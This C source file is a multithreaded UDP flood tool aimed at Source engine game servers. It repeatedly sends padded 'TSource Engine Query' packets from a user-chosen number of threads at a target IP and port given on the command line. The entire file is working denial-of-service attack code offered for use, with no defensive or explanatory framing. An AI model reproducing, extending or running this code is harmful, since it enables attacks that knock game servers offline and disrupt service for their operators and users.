#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PACKET_SIZE 4096
#define SOURCE_QUERY_PORT 27015


struct flood_data {
    char *target_ip;
    int target_port;
};


void create_query_packet(char *packet) {
  
    packet[0] = 0xFF;
    packet[1] = 0xFF;
    packet[2] = 0xFF;
    packet[3] = 0xFF;
    strcpy(packet + 4, "TSource Engine Query");
}


void *flood(void *arg) {
    struct flood_data *data = (struct flood_data *)arg;
    int sock;
    struct sockaddr_in target_addr;
    char packet[MAX_PACKET_SIZE];

  
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(data->target_port);
    target_addr.sin_addr.s_addr = inet_addr(data->target_ip);

   
    create_query_packet(packet);

    
    while (1) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(1000); 
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target IP> <target port> <number of threads>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);

    pthread_t threads[num_threads];
    struct flood_data data = {target_ip, target_port};

    
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, flood, (void *)&data) != 0) {
            perror("Failed to create thread");
            exit(EXIT_FAILURE);
        }
    }

    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
